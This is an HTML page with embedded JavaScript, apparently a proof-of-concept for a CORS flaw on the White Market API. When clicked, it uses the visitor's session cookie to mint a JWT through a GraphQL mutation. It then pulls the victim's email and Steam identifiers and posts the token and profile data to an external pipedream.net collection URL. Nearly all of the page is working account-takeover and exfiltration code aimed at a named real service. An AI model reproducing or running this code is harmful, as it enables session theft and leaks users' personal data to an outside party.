<!DOCTYPE html>
<html>
<head><title>White Market - Final Attack Test</title></head>
<body>
<h1>FINAL ATTACK TEST</h1>
<button onclick="attack()" style="padding: 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer;">
    ğŸš¨ TEST FULL ATTACK NOW ğŸš¨
</button>
<pre id="output"></pre>

<script>
const output = document.getElementById('output');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

async function attack() {
    output.textContent = '=== ATTACKING ===\n\n';
    
    // Step 1: Try to generate JWT via auth_token mutation
    output.textContent += 'Step 1: Attempting to steal refresh token and generate JWT...\n';
    
    try {
        const jwtResponse = await fetch('https://api.white.market/graphql/api', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'x-accept-language': 'en_US'
            },
            body: JSON.stringify({
                query: `
                    mutation AuthToken {
                        auth_token {
                            accessToken
                        }
                    }
                `,
                operationName: 'AuthToken'
            })
        });
        
        const jwtData = await jwtResponse.json();
        output.textContent += `Response: ${JSON.stringify(jwtData, null, 2)}\n\n`;
        
        if (jwtData.data && jwtData.data.auth_token) {
            output.textContent += 'âœ…âœ…âœ… SUCCESS! JWT STOLEN! âœ…âœ…âœ…\n\n';
            const jwt = jwtData.data.auth_token.accessToken;
            output.textContent += `JWT: ${jwt}\n\n`;
            
            // Exfiltrate to RequestBin
            fetch(REQUESTBIN, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack: 'FULL_ACCOUNT_TAKEOVER_SUCCESS',
                    jwt: jwt,
                    timestamp: new Date().toISOString(),
                    note: 'Persistent JWT stolen via CORS + token refresh cookie'
                })
            });
            
            // Step 2: Use the JWT to fetch victim data
            output.textContent += 'Step 2: Using stolen JWT to fetch victim profile...\n';
            
            const profileResponse = await fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'authorization': `Bearer ${jwt}`,
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify({
                    query: `
                        query PersonProfile {
                            person: person_profile {
                                id
                                email
                                steamId
                                steamName
                            }
                        }
                    `,
                    operationName: 'PersonProfile'
                })
            });
            
            const profileData = await profileResponse.json();
            output.textContent += `\nVictim Profile:\n${JSON.stringify(profileData, null, 2)}\n\n`;
            
            if (profileData.data && profileData.data.person) {
                output.textContent += `âœ… VICTIM IDENTIFIED:\n`;
                output.textContent += `  Email: ${profileData.data.person.email}\n`;
                output.textContent += `  Steam ID: ${profileData.data.person.steamId}\n`;
                output.textContent += `  Steam Name: ${profileData.data.person.steamName}\n\n`;
                
                fetch(REQUESTBIN, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        attack: 'VICTIM_DATA_EXFILTRATED',
                        victim: profileData.data.person,
                        jwt: jwt,
                        timestamp: new Date().toISOString()
                    })
                });
            }
            
            output.textContent += '\nğŸ¯ ATTACK COMPLETE - FULL ACCOUNT TAKEOVER ACHIEVED ğŸ¯\n';
            
        } else if (jwtData.errors) {
            output.textContent += 'âŒ JWT generation failed:\n';
            jwtData.errors.forEach(err => {
                output.textContent += `  ${err.message}\n`;
            });
            output.textContent += '\n(You probably need to login via Steam first)\n';
        }
        
    } catch (e) {
        output.textContent += `âŒ ERROR: ${e.message}\n`;
    }
}
</script>
</body>
</html>
